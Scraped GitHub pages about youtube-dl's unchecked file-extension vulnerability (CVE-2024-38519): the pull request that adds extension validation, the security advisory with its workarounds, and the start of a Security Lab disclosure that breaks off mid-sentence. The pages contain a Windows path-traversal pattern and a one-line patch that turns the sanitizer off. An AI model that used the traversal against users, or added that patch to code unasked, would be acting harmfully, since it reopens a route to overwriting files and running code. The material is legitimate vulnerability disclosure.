=== Content from github.com_9aa45318_20250111_204606.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fpull%2F32830)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fpull%2F32830)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=ytdl-org%2Fyoutube-dl)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[ytdl-org](/ytdl-org)
/
**[youtube-dl](/ytdl-org/youtube-dl)**
Public

* [Notifications](/login?return_to=%2Fytdl-org%2Fyoutube-dl) You must be signed in to change notification settings
* [Fork
  10.2k](/login?return_to=%2Fytdl-org%2Fyoutube-dl)
* [Star
   134k](/login?return_to=%2Fytdl-org%2Fyoutube-dl)

* [Code](/ytdl-org/youtube-dl)
* [Issues
  3.7k](/ytdl-org/youtube-dl/issues)
* [Pull requests
  497](/ytdl-org/youtube-dl/pulls)
* [Actions](/ytdl-org/youtube-dl/actions)
* [Projects
  0](/ytdl-org/youtube-dl/projects)
* [Security](/ytdl-org/youtube-dl/security)
* [Insights](/ytdl-org/youtube-dl/pulse)

Additional navigation options

* [Code](/ytdl-org/youtube-dl)
* [Issues](/ytdl-org/youtube-dl/issues)
* [Pull requests](/ytdl-org/youtube-dl/pulls)
* [Actions](/ytdl-org/youtube-dl/actions)
* [Projects](/ytdl-org/youtube-dl/projects)
* [Security](/ytdl-org/youtube-dl/security)
* [Insights](/ytdl-org/youtube-dl/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2Fytdl-org%2Fyoutube-dl%2Fissues%2Fnew%2Fchoose)

By clicking ‚ÄúSign up for GitHub‚Äù, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We‚Äôll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2Fytdl-org%2Fyoutube-dl%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# [core] Validate proposed file extensions #32830

 Merged

[dirkf](/dirkf)
merged 3 commits into
[ytdl-org:master](/ytdl-org/youtube-dl/tree/master "ytdl-org/youtube-dl:master")
from
[dirkf:ghsa-79w7-vh3h-8g4j](/dirkf/youtube-dl/tree/ghsa-79w7-vh3h-8g4j "dirkf/youtube-dl:ghsa-79w7-vh3h-8g4j")

Jul 2, 2024

 Merged

# [[core] Validate proposed file extensions](#top) #32830

[dirkf](/dirkf)
merged 3 commits into
[ytdl-org:master](/ytdl-org/youtube-dl/tree/master "ytdl-org/youtube-dl:master")
from
[dirkf:ghsa-79w7-vh3h-8g4j](/dirkf/youtube-dl/tree/ghsa-79w7-vh3h-8g4j "dirkf/youtube-dl:ghsa-79w7-vh3h-8g4j")

Jul 2, 2024

[Conversation
2](/ytdl-org/youtube-dl/pull/32830)
[Commits
3](/ytdl-org/youtube-dl/pull/32830/commits)
[Checks
14](/ytdl-org/youtube-dl/pull/32830/checks)
[Files changed](/ytdl-org/youtube-dl/pull/32830/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![dirkf](https://avatars.githubusercontent.com/u/1222880?s=60&v=4)](/dirkf)

Copy link

Contributor

### @dirkf **[dirkf](/dirkf)** commented [Jul 2, 2024](#issue-2386398509)

Boilerplate: yt-dlp/own code, fix
## Please follow the guide below

* You will be asked some questions, please read them **carefully** and answer honestly
* Put an `x` into all the boxes [ ] relevant to your *pull request* (like that [x])
* Use *Preview* tab to see how your *pull request* will actually look like

---

### Before submitting a *pull request* make sure you have:

* [Searched](https://github.com/ytdl-org/youtube-dl/search?q=is%3Apr&type=Issues) the bugtracker for similar pull requests
* Read [adding new extractor tutorial](https://github.com/ytdl-org/youtube-dl#adding-support-for-a-new-site)
* Read [youtube-dl coding conventions](https://github.com/ytdl-org/youtube-dl#youtube-dl-coding-conventions) and adjusted the code to meet them
* Covered the code with tests (note that PRs without tests will be REJECTED)
* Checked the code with [flake8](https://pypi.python.org/pypi/flake8)

### In order to be accepted and merged into youtube-dl each piece of code must be in public domain or released under [Unlicense](http://unlicense.org/). Check one of the following options:

* I am the original author of this code and I am willing to release it under [Unlicense](http://unlicense.org/), except for code from yt-dlp for which this or the below has already been asserted
* I am not the original author of this code but it is in public domain or released under [Unlicense](http://unlicense.org/) (provide reliable evidence)

### What is the purpose of your *pull request*?

* Bug fix
* Improvement
* New extractor
* New feature

---

### Description of your *pull request* and other information

This PR adds validation of file extensions processed by yt-dl

1. against a white-list of expected extensions (unpublicised `--no-check-extensions` disables this, CLI only)
2. to exclude path separators in a site-supplied extension that could enable path traversal under vulnerable OSes (Windows, eg).

The PR is derived from <https://github.com/yt-dlp/yt-dlp-ghsa-79w7-vh3h-8g4j/pull/1>.

Thanks:

* [@Grub4K](https://github.com/Grub4K) for the PR
* [@pukkandan](https://github.com/pukkandan) for the original report
* [@JarLob](https://github.com/JarLob) for a further report and for additional testing.

Sorry, something went wrong.

 üëç
1
 JarLob reacted with thumbs up emoji

All reactions

* üëç
  1 reaction

 [dirkf](/dirkf)
added 3 commits
[June 30, 2024 12:34](#commits-pushed-072a43e)

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

`[[utils] Back-port Namespace and MEDIA_EXTENSIONS from yt-dlp](/ytdl-org/youtube-dl/pull/32830/commits/072a43e0e328411a8ecca00c966105bc53503352 "[utils] Back-port Namespace and MEDIA_EXTENSIONS from yt-dlp
Thx pukkandan
* Namespace: https://github.com/yt-dlp/yt-dlp/commit/591bb9d355
* MEDIA_EXTENSIONS: https://github.com/yt-dlp/yt-dlp/commit/8dc5930511")`
 ‚Ä¶

`[072a43e](/ytdl-org/youtube-dl/pull/32830/commits/072a43e0e328411a8ecca00c966105bc53503352)`

```
Thx pukkandan
* Namespace: [yt-dlp/yt-dlp@591bb9d355](https://github.com/yt-dlp/yt-dlp/commit/591bb9d355)
* MEDIA_EXTENSIONS: [yt-dlp/yt-dlp@8dc5930511](https://github.com/yt-dlp/yt-dlp/commit/8dc5930511)
```

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

`[[core,utils] Implement unsafe file extension mitigation](/ytdl-org/youtube-dl/pull/32830/commits/d42a222ed541b96649396ef00e19552aef0f09ec "[core,utils] Implement unsafe file extension mitigation
* from https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4, thx grub4k")`
 ‚Ä¶

`[d42a222](/ytdl-org/youtube-dl/pull/32830/commits/d42a222ed541b96649396ef00e19552aef0f09ec)`

```
* from <https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4>, thx grub4k
```

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

`[[core,utils] Support unpublicised --no-check-extensions](/ytdl-org/youtube-dl/pull/32830/commits/e15101cb9970aa683d8e7e3e3f492869e4844e5b "[core,utils] Support unpublicised `--no-check-extensions`")`

`[e15101c](/ytdl-org/youtube-dl/pull/32830/commits/e15101cb9970aa683d8e7e3e3f492869e4844e5b)`

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
changed the title
~~Ghsa 79w7 vh3h 8g4j~~
[core] Validate proposed file extensions
[Jul 2, 2024](#event-13367047787)

 Hide details
View details

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
merged commit [`37cea84`](/ytdl-org/youtube-dl/commit/37cea84f775129ad715b9bcd617251c831fcc980)
into
ytdl-org:master

[Jul 2, 2024](https://github.com/ytdl-org/youtube-dl/pull/32830#event-13367351695)
14 checks passed

 [![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
deleted the
ghsa-79w7-vh3h-8g4j

branch
[July 2, 2024 14:39](#event-13367355470)

[![@eyaler](https://avatars.githubusercontent.com/u/4436747?s=80&v=4)](/eyaler)

Copy link

### **[eyaler](/eyaler)** commented [Jul 5, 2024](#issuecomment-2211162822)

| [@dirkf](https://github.com/dirkf) saving a video file without an extension is a practice which may be used for having a format-agnostic filename. this change breaks multiple scripts with this behavior. please consider reverting the behavior to allow no extension |
| --- |

All reactions

Sorry, something went wrong.

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=80&v=4)](/dirkf)

Copy link

Contributor

Author

### **[dirkf](/dirkf)** commented [Jul 5, 2024](#issuecomment-2211369081)

| Please open a support issue showing an example with verbose log and explaining what you think should happen instead.  Possible work-arounds for CLI:   * use `--exec ...` to rename away an unwanted extension * use `--no-check-extensions`   For API, try similar approaches to that in [e15101c](https://github.com/ytdl-org/youtube-dl/commit/e15101cb9970aa683d8e7e3e3f492869e4844e5b) (`__init__.py`) or the equivalent in *yt-dlp* (`_UnsafeExtensionError.sanitize_extension = lambda x, **kw: x`). |
| --- |

All reactions

Sorry, something went wrong.

[![@eyaler](https://avatars.githubusercontent.com/u/4436747?s=40&v=4)](/eyaler)
[eyaler](/eyaler)
mentioned this pull request
[Jul 6, 2024](#ref-issue-2393494968)

[Breaking change no allowing saving output with no extension
#32838](/ytdl-org/youtube-dl/issues/32838)

Closed

6 tasks

[dirkf](/dirkf)
added a commit
to dirkf/youtube-dl
that referenced
this pull request
[Jul 7, 2024](#ref-commit-d08b5e3)
[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

`[[core] Fix PR](/dirkf/youtube-dl/commit/d08b5e31d19c825616ee3221751fa4c96b54d92b "[core] Fix PR #32830 for fixed extensionless output template") [ytdl-org#32830](https://github.com/ytdl-org/youtube-dl/pull/32830) [for fixed extensionless output template](/dirkf/youtube-dl/commit/d08b5e31d19c825616ee3221751fa4c96b54d92b "[core] Fix PR #32830 for fixed extensionless output template")`

`[d08b5e3](/dirkf/youtube-dl/commit/d08b5e31d19c825616ee3221751fa4c96b54d92b)`

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
mentioned this pull request
[Jul 7, 2024](#ref-pullrequest-2394195287)

[[core] Fix PR #32830 for fixed extensionless output template
#32841](/ytdl-org/youtube-dl/pull/32841)
 Merged

11 tasks

[dirkf](/dirkf)
added a commit
that referenced
this pull request
[Jul 7, 2024](#ref-commit-a452f94)
[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)

`[[core] Fix PR](/ytdl-org/youtube-dl/commit/a452f9437c8a3048f75fc12f75bcfd3eed78430f "[core] Fix PR #32830 for fixed extensionless output template") [#32830](https://github.com/ytdl-org/youtube-dl/pull/32830) [for fixed extensionless output template](/ytdl-org/youtube-dl/commit/a452f9437c8a3048f75fc12f75bcfd3eed78430f "[core] Fix PR #32830 for fixed extensionless output template")`

`[a452f94](/ytdl-org/youtube-dl/commit/a452f9437c8a3048f75fc12f75bcfd3eed78430f)`

[github-actions](/apps/github-actions) bot
added a commit
to hellopony/youtube-dl
that referenced
this pull request
[Jul 8, 2024](#ref-commit-b8436fb)
[![@github-actions](https://avatars.githubusercontent.com/in/15368?s=40&v=4)](/apps/github-actions)

`[[bot] AutoMerging: merge all upstream's changes:](/hellopony/youtube-dl/commit/b8436fbe3fe033c7c9a2911844a9621bbee59146 "[bot] AutoMerging: merge all upstream's changes:

* https://github.com/ytdl-org/youtube-dl:
  [core] Fix PR #32830 for fixed extensionless output template
  [YandexMusic] Save track version in the title field")`
‚Ä¶

`[b8436fb](/hellopony/youtube-dl/commit/b8436fbe3fe033c7c9a2911844a9621bbee59146)`

```
* <https://github.com/ytdl-org/youtube-dl>:
  [core] Fix PR [ytdl-org#32830](https://github.com/ytdl-org/youtube-dl/pull/32830) for fixed extensionless output template
  [YandexMusic] Save track version in the title field
```

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
mentioned this pull request
[Jul 10, 2024](#ref-pullrequest-2401349759)

[[JSInterp, YouTube] Support YT player `b22ef6e7` etc
#32845](/ytdl-org/youtube-dl/pull/32845)
 Merged

11 tasks

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
[dirkf](/dirkf)
mentioned this pull request
[Jul 30, 2024](#ref-issue-2421397277)

[Inconsistent character substitution in file name and in --exec option
#32871](/ytdl-org/youtube-dl/issues/32871)

Closed

1 task

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2Fytdl-org%2Fyoutube-dl%2Fpull%2F32830)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=52&v=4)](/dirkf) [![@eyaler](https://avatars.githubusercontent.com/u/4436747?s=52&v=4)](/eyaler)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from github.com_a2e2a9bb_20250111_204602.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdirkf%2Fyoutube-dl%2Fsecurity%2Fadvisories%2FGHSA-22fp-mf44-f2mq)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdirkf%2Fyoutube-dl%2Fsecurity%2Fadvisories%2FGHSA-22fp-mf44-f2mq)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=dirkf%2Fyoutube-dl)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dirkf](/dirkf)
/
**[youtube-dl](/dirkf/youtube-dl)**
Public

forked from [ytdl-org/youtube-dl](/ytdl-org/youtube-dl)

* [Notifications](/login?return_to=%2Fdirkf%2Fyoutube-dl) You must be signed in to change notification settings
* [Fork
  9](/login?return_to=%2Fdirkf%2Fyoutube-dl)
* [Star
   35](/login?return_to=%2Fdirkf%2Fyoutube-dl)

* [Code](/dirkf/youtube-dl)
* [Pull requests
  0](/dirkf/youtube-dl/pulls)
* [Actions](/dirkf/youtube-dl/actions)
* [Projects
  0](/dirkf/youtube-dl/projects)
* [Security](/dirkf/youtube-dl/security)
* [Insights](/dirkf/youtube-dl/pulse)

Additional navigation options

* [Code](/dirkf/youtube-dl)
* [Pull requests](/dirkf/youtube-dl/pulls)
* [Actions](/dirkf/youtube-dl/actions)
* [Projects](/dirkf/youtube-dl/projects)
* [Security](/dirkf/youtube-dl/security)
* [Insights](/dirkf/youtube-dl/pulse)

# File system modification and remote code execution through unchecked file extension

High

[dirkf](/dirkf)
published
GHSA-22fp-mf44-f2mq
Jul 2, 2024

## Package

pip

youtube-dl
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

2015.01.25 - 2021.12.17 and daily/nightly builds up to publication of this advisory

## Patched versions

Master code d42a222 or later; nightly builds tagged 2024-07-03 or later

## Description

#### Description

This advisory follows the security advisory [GHSA-79w7-vh3h-8g4j published by the *yt-dlp/yt-dlp* project](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j) to aid remediation of the issue in the *ytdl-org/youtube-dl* project.

### Vulnerability

*youtube-dl* does not limit the extensions of downloaded files, which could lead to arbitrary filenames being created in the download folder (and path traversal on Windows).

### Impact

Since *youtube-dl* also reads config from the working directory (and, on Windows, executables will be executed from the *youtube-dl* directory by default) the vulnerability could allow the unwanted execution of local code, including downloads masquerading as, eg, subtitles.

### Patches

The versions of *youtube-dl* listed as *Patched* remediate this vulnerability by disallowing path separators and whitelisting allowed extensions. As a result, some very uncommon extensions might not get downloaded.

### Workarounds

Any/all of the below considerations may limit exposure in case it is necessary to use a vulnerable version

* have `.%(ext)s` at the end of the output template
* download from websites that you trust
* do not download to a directory within the executable search `PATH` or other sensitive locations, such as your user directory or system directories
* in Windows versions that support it, set [`NoDefaultCurrentDirectoryInExePath`](https://stackoverflow.com/a/50118548) to prevent the *cmd* shell's executable search adding the default directory before `PATH`
* consider that the path traversal vulnerability as a result of resolving `non_existent_dir\..\..\target` does not exist in Linux or macOS
* ensure the extension of the media to download is a common video/audio/... one (use `--get-filename`)
* omit any of the subtitle options (`--write-subs`/ `--write-srt`, `--write-auto-subs`/`--write-automatic-subs`, `--all-subs`).

### References

* [GHSA-79w7-vh3h-8g4j](https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-79w7-vh3h-8g4j)
* [ytdl-org#32830](https://github.com/ytdl-org/youtube-dl/pull/32830)

### Severity

High

7.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Local

Attack complexity
Low

Privileges required
None

User interaction
Required

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-38519

### Weaknesses

No CWEs

### Credits

* [![@pukkandan](https://avatars.githubusercontent.com/u/6623388?s=40&v=4)](/pukkandan)
  [pukkandan](/pukkandan)
  Finder
* [![@JarLob](https://avatars.githubusercontent.com/u/26652396?s=40&v=4)](/JarLob)
  [JarLob](/JarLob)
  Reporter
* [![@Grub4K](https://avatars.githubusercontent.com/u/37424085?s=40&v=4)](/Grub4K)
  [Grub4K](/Grub4K)
  Remediation developer
* [![@dirkf](https://avatars.githubusercontent.com/u/1222880?s=40&v=4)](/dirkf)
  [dirkf](/dirkf)
  Remediation reviewer

## Footer

¬© 2025 GitHub,¬†Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can‚Äôt perform that action at this time.



=== Content from securitylab.github.com_db27f94f_20250111_204606.html ===

[skip to content](#content)

 /
[Security Lab](/ "Security Lab")
[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Events](/events/ "Events")

[Get Involved](/get-involved/)

* Resources
* [Open Source Community](/open-source "Home")
* [Enterprise](/enterprise "Home")

 /
[Security Lab](/ "Security Lab")

[Research](https://github.blog/tag/github-security-lab/ "Research")
[Advisories](/advisories/ "Advisories")
[CodeQL Wall of Fame](/codeql-wall-of-fame/ "CodeQL Wall of Fame")
Resources

[Open Source Community](/open-source "Open Source Community")
[Enterprise](/enterprise "Enterprise")

[Events](/events/ "Events")
[Get Involved](/get-involved/ "Events")

July 3, 2024
# GHSL-2024-089: Path traversal in youtube-dl leading to RCE - CVE-2024-38519

[![Author avatar](https://avatars.githubusercontent.com/u/26652396)
Jaroslav Lobaƒçevski](https://github.com/jarlob)

## Coordinated Disclosure Timeline

* 2024-05-24: The report was sent to the maintainer.
* 2024-07-03: [v2024.07.03](https://github.com/ytdl-org/ytdl-nightly/releases/tag/2024.07.03) with the fix was released.
* 2024-07-03: The advisory was published.

## Summary

`youtube-dl` doesn‚Äôt validate the subtitle extension name, which makes its Windows users vulnerable to path traversal and allows for arbitrary binary file overwrite when downloading a video with subtitles from a crafted link.

## Project

youtube-dl

## Tested Version

The nightly [v2024.05.16](https://github.com/ytdl-org/ytdl-nightly/releases/tag/2024.05.16.1) and the last official [v2021.12.17](https://github.com/ytdl-org/youtube-dl/releases/tag/2021.12.17).

## Details

### Path traversal saving subtitles (`GHSL-2024-089`)

`youtube-dl` is capable of downloading not only video files, but also accompanying subtitles if the user specifies the `--write-sub`, `--write-auto-sub`, or `--all-subs` option. Each supported video website has a dedicated [extractor](https://github.com/ytdl-org/youtube-dl/tree/master/youtube_dl/extractor). Some extractors provide [only urls of subtitles](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/extractor/slideslive.py#L70-L72) and youtube-dl [resolves their extension from the url path](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/YoutubeDL.py#L1690). Others provide the urls and the subtitle extensions explicitly. In turn, some of the latter extractors [validate the extracted subtitle extension](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/extractor/anvato.py#L316-L320), but others trust the extracted value [blindly](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/extractor/microsoftvirtualacademy.py#L108-L110). youtube-dl honors the provided extension name and uses it to [build the name of the output file for subtitles](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/YoutubeDL.py#L2010) in [1]. The `filename` is the generated name for the video file, `sub_lang` is `en` by default, `sub_format` is the extracted subtitles extension and `info_dict.get('ext')` contains the video file extension to [replace with](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/utils.py#L3967-L3971) the `sub_format` in [`subtitles_filename`](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/utils.py#L3257-L3258). The subtitle is written as a binary file in [2]. The `encodeFilename` is just a wrapper for Unicode support that does nothing in Python 3. If the user doesn‚Äôt override the [default output file template `%(title)s-%(id)s.%(ext)s`](https://github.com/ytdl-org/youtube-dl/blob/a08f2b7e4567cdc50c0614ee0a4ffdff49b8b6e6/youtube_dl/utils.py#L4621), then the `sub_filename` is formatted as `%(title)s-%(id)s.%(sub_lang).%(sub_format)s`. The path traversal injection in `sub_format` doesn‚Äôt work on Linux because Linux 